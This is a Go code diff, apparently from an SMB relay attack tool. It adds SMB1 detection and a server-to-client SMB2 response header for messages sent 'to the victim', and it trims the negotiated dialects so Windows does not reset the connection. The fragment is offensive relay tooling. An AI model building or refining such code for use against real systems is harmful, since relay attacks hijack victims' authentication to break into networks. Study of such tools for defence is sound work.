@@ -125,6 +125,10 @@ func isSMB2(msg []byte) bool {
 	return len(msg) >= 4 && msg[0] == 0xFE && msg[1] == 0x53 && msg[2] == 0x4D && msg[3] == 0x42
 }
 
+func isSMB1(msg []byte) bool {
+	return len(msg) >= 4 && msg[0] == 0xFF && msg[1] == 0x53 && msg[2] == 0x4D && msg[3] == 0x42
+}
+
 func smb2Status(msg []byte) uint32 {
 	if len(msg) < 12 {
 		return 0xFFFFFFFF
@@ -132,7 +136,7 @@ func smb2Status(msg []byte) uint32 {
 	return binary.LittleEndian.Uint32(msg[8:12])
 }
 
-// smb2Hdr builds a 64-byte SMB2 header.
+// smb2Hdr builds a 64-byte SMB2 request header (Flags=0, client-to-server).
 func smb2Hdr(cmd uint16, msgID uint64, status uint32, sessionID uint64, treeID uint32) []byte {
 	h := make([]byte, 64)
 	h[0] = 0xFE
@@ -143,7 +147,7 @@ func smb2Hdr(cmd uint16, msgID uint64, status uint32, sessionID uint64, treeID u
 	binary.LittleEndian.PutUint32(h[8:12], status)     // Status
 	binary.LittleEndian.PutUint16(h[12:14], cmd)       // Command
 	binary.LittleEndian.PutUint16(h[14:16], 31)        // CreditRequest
-	binary.LittleEndian.PutUint32(h[16:20], 0)         // Flags
+	binary.LittleEndian.PutUint32(h[16:20], 0)         // Flags (client-to-server)
 	binary.LittleEndian.PutUint64(h[24:32], msgID)     // MessageId
 	binary.LittleEndian.PutUint32(h[32:36], 0xFFFE)    // ProcessId
 	binary.LittleEndian.PutUint32(h[36:40], treeID)    // TreeId
@@ -151,9 +155,19 @@ func smb2Hdr(cmd uint16, msgID uint64, status uint32, sessionID uint64, treeID u
 	return h
 }
 
+// smb2RespHdr builds a 64-byte SMB2 response header (SMB2_FLAGS_SERVER_TO_REDIR set).
+// All messages sent FROM the relay engine TO the victim must use this builder.
+func smb2RespHdr(cmd uint16, msgID uint64, status uint32, sessionID uint64) []byte {
+	h := smb2Hdr(cmd, msgID, status, sessionID, 0)
+	binary.LittleEndian.PutUint32(h[16:20], 0x00000001) // SMB2_FLAGS_SERVER_TO_REDIR
+	return h
+}
+
 // buildNegotiateReq builds an SMB2 NEGOTIATE request.
+// We advertise only SMB 2.0.2 and 2.1 — advertising SMB 3.x requires
+// NegotiateContexts that we don't include, causing Windows to RST us.
 func buildNegotiateReq(msgID uint64) []byte {
-	dialects := []uint16{0x0202, 0x0210, 0x0300}
+	dialects := []uint16{0x0202, 0x0210}
 	hdr := smb2Hdr(0x0000, msgID, 0, 0, 0)
 	var body []byte
 	body = binary.LittleEndian.AppendUint16(body, 36)
